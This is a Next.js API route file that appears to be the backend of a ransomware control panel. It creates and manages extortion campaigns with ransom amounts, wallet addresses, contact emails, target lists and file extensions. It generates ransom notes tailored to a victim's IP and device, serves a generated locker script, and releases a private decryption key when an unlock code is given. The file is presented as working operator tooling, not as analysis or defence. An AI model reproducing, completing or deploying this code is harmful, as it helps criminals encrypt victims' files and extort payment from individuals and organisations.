import { NextResponse } from "next/server";
import { isAuthorized } from "@/lib/auth";
import {
  createCampaign,
  listCampaigns,
  getCampaign,
  updateCampaign,
  deleteCampaign,
  getLockerStatus,
  generateRansomNote,
  generateLockerScript,
  recoverPrivateKey,
} from "@/lib/locker";

export async function GET(request: Request) {
  if (!isAuthorized(request)) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const url = new URL(request.url);
  const action = url.searchParams.get("action");

  try {
    if (action === "status") {
      return NextResponse.json(getLockerStatus());
    }
    if (action === "list") {
      return NextResponse.json({ campaigns: listCampaigns() });
    }
    if (action === "get") {
      const id = url.searchParams.get("id");
      if (!id) return NextResponse.json({ error: "id required" }, { status: 400 });
      const campaign = getCampaign(id);
      if (!campaign) return NextResponse.json({ error: "Campaign not found" }, { status: 404 });
      return NextResponse.json({ campaign });
    }
    if (action === "note") {
      const id = url.searchParams.get("id");
      const ip = url.searchParams.get("ip") || "0.0.0.0";
      const device = url.searchParams.get("device") || "unknown";
      const customNote = url.searchParams.get("customNote") || "";
      if (!id) return NextResponse.json({ error: "id required" }, { status: 400 });
      const campaign = getCampaign(id);
      if (!campaign) return NextResponse.json({ error: "Campaign not found" }, { status: 404 });
      const note = generateRansomNote(campaign, { ip, device, customNote });
      return NextResponse.json({ note });
    }
    if (action === "script") {
      const id = url.searchParams.get("id");
      if (!id) return NextResponse.json({ error: "id required" }, { status: 400 });
      const script = generateLockerScript(id);
      return new NextResponse(script, {
        headers: { "Content-Type": "text/plain" },
      });
    }
    if (action === "recover-key") {
      const id = url.searchParams.get("id");
      const code = url.searchParams.get("code");
      if (!id || !code) return NextResponse.json({ error: "id and code required" }, { status: 400 });
      const key = recoverPrivateKey(id, code);
      if (!key) return NextResponse.json({ error: "Invalid unlock code" }, { status: 403 });
      return NextResponse.json({ privateKey: key, campaignId: id });
    }
    return NextResponse.json({ error: "Unknown action" }, { status: 400 });
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : "Failed" },
      { status: 502 },
    );
  }
}

export async function POST(request: Request) {
  if (!isAuthorized(request)) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  try {
    const body = await request.json();
    const { action } = body;

    if (action === "create") {
      const campaign = createCampaign(body.name || "Unnamed Campaign", {
        ransomAmount: body.ransomAmount,
        walletAddress: body.walletAddress,
        contactEmail: body.contactEmail,
        noteTemplate: body.noteTemplate,
        extensions: body.extensions,
        targets: body.targets,
        deviceNotes: body.deviceNotes,
      });
      return NextResponse.json({ campaign });
    }

    if (action === "update") {
      const updated = updateCampaign(body.id, body.updates);
      if (!updated) return NextResponse.json({ error: "Campaign not found" }, { status: 404 });
      return NextResponse.json({ campaign: updated });
    }

    if (action === "delete") {
      const ok = deleteCampaign(body.id);
      return NextResponse.json({ deleted: ok });
    }

    return NextResponse.json({ error: "Unknown action" }, { status: 400 });
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : "Failed" },
      { status: 502 },
    );
  }
}
